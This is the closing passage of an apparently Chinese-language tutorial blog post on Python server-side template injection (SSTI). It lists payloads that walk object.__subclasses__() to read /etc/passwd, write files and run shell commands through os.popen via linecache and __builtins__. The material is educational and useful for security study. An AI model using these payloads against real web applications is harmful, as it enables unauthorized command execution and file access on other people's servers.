<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[40] 为file类，所以可以对文件进行操作</span><br><span class="line"></span><br><span class="line">读文件：</span><br><span class="line">object.__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()</span><br><span class="line"></span><br><span class="line">写文件：</span><br><span class="line">object.__subclasses__()[40](&#39;&#x2F;tmp&#39;).write(&#39;test&#39;)</span><br></pre></td></tr></table></figure>

<p>执行命令</p>
<p><code>object.__subclasses__()[59].__init__.func_globals.linecache</code> 下有os类，可以直接执行命令：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">'id'</span>).read()</span><br></pre></td></tr></table></figure>

<p><code>object.__subclasses__()[59].__init__.__globals__.__builtins__</code> 下有eval，<strong>import</strong>等的全局函数，可以利用此来执行命令：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"__import__('os').popen('id').read()"</span>)</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.eval(<span class="string">"__import__('os').popen('id').read()"</span>)</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.__import__(<span class="string">'os'</span>).popen(<span class="string">'id'</span>).read()</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).popen(<span class="string">'id'</span>).read()</span><br></pre></td></tr></table></figure>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/Links/">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti漏洞成因"><span class="toc-number">1.</span> <span class="toc-text">ssti漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#前置知识"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssti-利用过程"><span class="toc-number">3.</span> <span class="toc-text">ssti 利用过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">4.</span> <span class="toc-text">Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload-收集"><span class="toc-number">5.</span> <span class="toc-text">payload 收集</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://startpwn.top/2020/05/04/ssti-learn/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://startpwn.top/2020/05/04/ssti-learn/&text=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://startpwn.top/2020/05/04/ssti-learn/&title=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://startpwn.top/2020/05/04/ssti-learn/&is_video=false&description=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Python 模板注入(SSTI) 初探&body=Check out this article: http://startpwn.top/2020/05/04/ssti-learn/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://startpwn.top/2020/05/04/ssti-learn/&title=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://startpwn.top/2020/05/04/ssti-learn/&title=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://startpwn.top/2020/05/04/ssti-learn/&title=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://startpwn.top/2020/05/04/ssti-learn/&title=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://startpwn.top/2020/05/04/ssti-learn/&name=Python 模板注入(SSTI) 初探&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://startpwn.top/2020/05/04/ssti-learn/&t=Python 模板注入(SSTI) 初探" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2022
    ssta
    <a href="http://www.beian.miit.gov.cn/" target="_blank" rel="noopener" >津ICP备20002899号</a>
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Archives</a></li>
         
          <li><a href="/Links/">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


</body>
</html>
